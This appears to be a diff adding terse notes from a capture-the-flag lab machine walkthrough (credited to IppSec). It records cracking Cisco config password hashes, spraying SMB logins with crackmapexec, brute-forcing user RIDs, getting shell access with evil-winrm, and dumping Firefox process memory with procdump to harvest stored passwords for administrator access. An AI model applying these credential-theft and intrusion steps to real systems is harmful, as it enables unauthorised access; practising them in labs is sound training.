@@ -1,0 +1,39 @@
+//Based on IppSec
+http://10.10.10.149/login.php
+//login as guest
+http://10.10.10.149/issues.php
+http://10.10.10.149/attachments/config.txt
+
+https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html
+enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91 
+
+https://www.ifm.net.nz/cookbooks/passwordcracker.html
+username rout3r password 7 0242114B0E143F015F5D1E161713 : $uperP@ssword
+username admin privilege 15 password 7 02375012182C1A1D751618034F36415408 : Q4)sJu\Y8qz*A3?d
+
+echo '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' > hash.txt
+john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+john hash.txt --show
+?:stealth1agent
+
+crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt
+SupportDesk\Hazard:stealth1agent
+
+cme smb 10.10.10.149 -u Hazard -p stealth1agent --rid-brute	//get RID VAlues (Users)
+
+//commented Hazard and
+crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt
+SupportDesk\Chase:Q4)sJu\Y8qz*A3?d
+
+evil-winrm -i 10.10.10.149 -u Chase -p 'Q4)sJu\Y8qz*A3?d'	//got user
+
+Get-process
+upload procdump64.exe .
+.\procdump64.exe -accepteula
+.\procdump64.exe -ma 724		//same for all firefox instances
+
+strings firefox.exe_210922_002843.dmp | grep -i password > temp.txt
+admin@support.htb& : 4dD!5}x/re8]FBuZ
+crackmapexec smb 10.10.10.149 -u users.txt -p passwords.txt
+administrator : 4dD!5}x/re8]FBuZ
+evil-winrm -i 10.10.10.149 -u administrator -p '4dD!5}x/re8]FBuZ'	//got root 
